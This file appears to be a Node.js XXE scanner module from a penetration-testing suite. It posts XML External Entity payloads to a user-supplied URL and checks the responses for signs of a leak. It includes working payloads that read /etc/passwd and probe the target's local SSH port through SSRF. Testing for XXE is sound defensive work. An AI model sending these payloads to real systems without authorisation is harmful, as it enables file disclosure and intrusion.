#!/usr/bin/env node
'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: xxe-tester.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




const axios = require('axios');
const { getModuleById } = require('../lib/module-catalog');
const { parseArgs } = require('../lib/module-runner');
const { HttpHistoryLogger } = require('../utils/http-history-logger');

const definition = getModuleById('vuln-probes/xxe-tester');
const historyLogger = new HttpHistoryLogger();

async function run(argv = process.argv) {
  const { flags } = parseArgs(argv.slice(2));
  const url = flags.url;

  if (!url) {
    console.log(`Usage: node ${definition.filePath} --url <target-url> --method POST --data '<root><id>1</id></root>'`);
    return;
  }

  const method = (flags.method || 'POST').toUpperCase();
  const baseData = flags.data || '<root/>';

  console.log(`[*] Testing XXE on ${url} via ${method}...`);
  const findings = [];
  const xxePayloads = [
    {
      payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
      description: 'LFI-based XXE (passwd)'
    },
    {
      payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>`,
      description: 'SSRF-based XXE (SSH)'
    }
  ];

  for (const p of xxePayloads) {
    try {
      const startTime = Date.now();
      const response = await axios({
        method,
        url,
        data: p.payload,
        headers: { 'Content-Type': 'application/xml' },
        timeout: 10000,
        validateStatus: () => true
      });
      const duration = Date.now() - startTime;

      historyLogger.logRequest({
        tool: definition.id,
        method,
        url,
        requestHeaders: { 'Content-Type': 'application/xml' },
        statusCode: response.status,
        responseHeaders: response.headers,
        responseBody: typeof response.data === 'string' ? response.data : JSON.stringify(response.data),
        durationMs: duration
      });

      const bodyStr = String(response.data || '').toLowerCase();
      if (bodyStr.includes('root:x:0:0') || bodyStr.includes('ssh-2.0')) {
        findings.push({
          title: `Potential XXE (${p.description})`,
          severity: 'Critical',
          target: url,
          tool: definition.id,
          cvss: '9.3',
          evidence: {
            request: `${method} ${url}\nPayload: ${p.payload}`,
            response: `Status: ${response.status}\nBody Snippet: ${bodyStr.slice(0, 500)}`
          },
          remediation: 'Disable external entity (DDT/Entity) expansion in the XML parser configuration. Use safe formats like JSON whenever possible.'
        });
        console.log(`[!] CRITICAL XXE VULNERABILITY: ${url} (Payload: ${p.description})`);
      }
    } catch (err) {
      // Skip
    }
  }

  if (findings.length > 0) {
    console.log(`[+] Found ${findings.length} XXE issues!`);
    process.stdout.write(JSON.stringify(findings, null, 2) + '\n');
  } else {
    console.log('[-] No XXE detected via direct reflection.');
  }

  return findings;
}

if (require.main === module) {
  run().catch(console.error);
}

module.exports = { run };
